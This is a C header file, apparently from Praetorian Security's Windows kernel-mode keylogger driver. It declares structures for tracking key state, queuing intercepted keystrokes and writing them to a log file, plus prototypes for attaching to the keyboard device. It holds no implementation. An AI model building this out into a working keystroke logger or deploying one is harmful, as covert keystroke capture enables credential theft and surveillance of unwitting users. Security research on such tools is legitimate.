/*
 * Copyright 2022 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#pragma once

#include <ntddk.h>

//
// Disable compiler warnings
//

#pragma warning( disable: 4995 )
#pragma warning( disable: 4996 )

typedef struct _KEY_STATE
{
  int kSHIFT;    //if the shift key is pressed
  int kCAPSLOCK; //if the caps lock key is pressed down
  int kCTRL;     //if the control key is pressed down
  int kALT;      //if the alt key is pressed down
} KEY_STATE;

typedef struct _KEY_DATA
{
  LIST_ENTRY ListEntry;
  char KeyData;
  char KeyFlags;
} KEY_DATA;

typedef struct _KEYLOG_DEVICE_EXTENSION
{
	PDEVICE_OBJECT KeyboardDevice; // Pointer to device object below us on the driver stack          
	PETHREAD ThreadObj;            // Pointer to worker thread object                                
	int ThreadTerminate;           // Mechanism to signal worker thread to terminate itself          

	KEY_STATE kState;               // State of keystrokes when processing key-press combinations      
	HANDLE KeystrokeFile;          // Handle to file object which we use to write intercepted keys to disk  

	PDEVICE_OBJECT KeyboardDeviceObject;

	KSEMAPHORE semQueue;            // Used to tell worker thread that there is now data in the queue 
	KSPIN_LOCK lockQueue;           // Used to synchronize access to linked list of keystrokes        
	LIST_ENTRY QueueListHead;       // Stores linked list of pressed keys 		            
} KEYLOG_DEVICE_EXTENSION, *PKEYLOG_DEVICE_EXTENSION;

NTSTATUS KeylogAttachDevice(PUNICODE_STRING KeyboardName, PUNICODE_STRING KeylogFilePath);
NTSTATUS KeylogInit(IN PDRIVER_OBJECT DriverObject);
